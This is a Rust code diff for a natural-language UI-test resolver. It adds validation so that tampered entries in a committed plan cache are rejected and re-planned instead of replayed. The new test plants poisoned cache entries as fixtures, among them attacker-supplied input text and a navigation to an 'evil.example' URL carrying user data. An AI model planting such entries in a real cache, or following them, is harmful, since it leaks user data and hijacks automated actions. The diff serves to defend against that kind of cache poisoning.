@@ -257,6 +257,25 @@ impl NaturalResolver {
                     continue;
                 }
             }
+            // The cache file is untrusted: a stored value must be a
+            // placeholder or the step's own words, as for a fresh plan.
+            if let Err(why) = crate::grounding::check_cached(
+                &hit.action,
+                step.intent,
+                step.kind,
+                step.data.is_some(),
+                &|t| {
+                    t == DATA_PLACEHOLDER
+                        || (0..literals.len()).any(|i| t == literal_placeholder(i))
+                },
+            ) {
+                tracing::warn!(
+                    intent = step.intent,
+                    "velocity-nl: the cached resolution fails the checks a fresh plan passes \
+                     ({why}; an edited nl-cache.json?); ignoring it and re-planning"
+                );
+                continue;
+            }
             let Some(action) = fill(&hit.action, step.data, &literals) else {
                 continue;
             };
@@ -899,6 +918,83 @@ mod tests {
             fresh: false,
             describe_data: false,
         }
+    }
+
+    // nl-cache.json is committed and so is untrusted: an edited entry must
+    // pass the checks a fresh plan does before it is replayed.
+    #[tokio::test]
+    async fn a_hand_edited_cache_entry_is_checked_like_a_fresh_plan() {
+        let dir = std::env::temp_dir().join(format!("velnl-res-{}-edited", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        let path = dir.join("nl-cache.json");
+        let sel = || Selector::Id("email".into());
+        let mut cache = NlCache::default();
+        let mut put = |s: &NaturalStep<'_>, action: Action| {
+            cache.put(s.cache_key(), s.intent, Platform::Android, action);
+        };
+        let type_step = step("type \"alice@x.io\" into Email");
+        let typed = |t: &str| Action::InputText {
+            selector: sel(),
+            text: t.into(),
+        };
+        put(&type_step, typed("attacker text"));
+        let tap_step = step("tap login");
+        put(&tap_step, typed("anything"));
+        let goto_step = step("go to \"https://shop.example/\"");
+        put(
+            &goto_step,
+            Action::Goto {
+                url: "https://evil.example/\u{1}velocity:data\u{1}".into(),
+            },
+        );
+        let wait_step = step("tap login again");
+        put(&wait_step, Action::Wait { ms: 5000 });
+        let gone_step = step("verify \"Welcome\" is gone");
+        let gone = |t: &str| Action::AssertNotVisible {
+            selector: Selector::TextContains(t.into()),
+        };
+        put(&gone_step, gone("something unrelated"));
+        cache.save(&path).unwrap();
+        let r = NaturalResolver::new(
+            Box::new(Garbled {
+                bad: AtomicUsize::new(0),
+                feedback: StdMutex::new(Vec::new()),
+            }),
+            &path,
+        );
+        for s in [&type_step, &tap_step, &goto_step, &wait_step] {
+            assert!(r.cached_hit(s).await.is_none(), "{}", s.intent);
+        }
+        let mut gone_step = gone_step;
+        gone_step.kind = NaturalKind::Assert;
+        assert!(r.cached_hit(&gone_step).await.is_none());
+
+        // Entries a real plan would have stored still replay.
+        let mut good = NlCache::default();
+        let mut ok = |s: &NaturalStep<'_>, a: Action| {
+            good.put(s.cache_key(), s.intent, Platform::Android, a)
+        };
+        ok(&type_step, typed(&literal_placeholder(0)));
+        ok(
+            &goto_step,
+            Action::Goto {
+                url: "https://shop.example/".into(),
+            },
+        );
+        ok(&gone_step, gone("Welcome"));
+        let path = dir.join("good.json");
+        good.save(&path).unwrap();
+        let r = NaturalResolver::new(
+            Box::new(Garbled {
+                bad: AtomicUsize::new(0),
+                feedback: StdMutex::new(Vec::new()),
+            }),
+            &path,
+        );
+        let hit = r.cached_hit(&type_step).await.unwrap();
+        assert!(matches!(hit.action, Action::InputText { ref text, .. } if text == "alice@x.io"));
+        assert!(r.cached_hit(&goto_step).await.is_some());
+        assert!(r.cached_hit(&gone_step).await.is_some());
     }
 
     #[tokio::test]
